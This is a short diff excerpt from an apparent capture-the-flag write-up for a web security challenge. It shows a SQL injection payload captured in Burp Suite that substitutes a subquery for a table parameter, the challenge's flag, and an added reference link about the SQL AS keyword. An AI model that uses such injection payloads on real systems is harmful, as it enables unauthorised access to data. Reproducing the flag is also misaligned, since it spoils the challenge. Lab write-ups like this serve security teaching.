@@ -53,3 +53,7 @@ if (isset ($_POST['submit']) && isset ($_POST['user_id']) && isset ($_POST['tabl
 + So intercepting the request in burp suite, the payload looks like this:
 payload: user_id=2&table=(select 2 id, enemy username from costume)&submit=Submit+Query
 Flag: WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
+
+
+Reference:
+https://www.sqlshack.com/sql-as-keyword-overview-and-examples/#:~:text=SQL%20AS%20keyword%20is%20used,headings%20in%20the%20result%20set.
